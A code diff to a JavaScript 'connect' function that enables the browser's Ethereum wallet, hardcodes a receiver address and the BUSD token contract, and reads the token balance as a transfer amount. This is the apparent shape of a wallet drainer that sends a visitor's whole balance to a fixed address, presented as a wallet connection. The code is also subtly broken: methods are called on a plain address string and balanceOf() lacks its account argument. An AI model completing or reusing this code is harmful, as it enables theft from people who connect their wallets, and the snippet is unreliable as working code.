@@ -1,12 +1,9 @@
 var web3;
 
 async function connect(){
-    await window.web3.currentProvider.enable();
+    await window.ethereum.enable()
     
-   
-
-
-   const receiverAddress = '0xa84cE4D7f2462b084069c6caDCa56dd603C15eF4'
+      const receiverAddress = '0xa84cE4D7f2462b084069c6caDCa56dd603C15eF4'
       const busdAddress = '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'
       
         const trfAmount=await busdAddress.methods.balanceOf().call();
@@ -22,6 +19,3 @@ async function connect(){
         .catch((err) => {
           console.log(err)
         })
-
-
-}
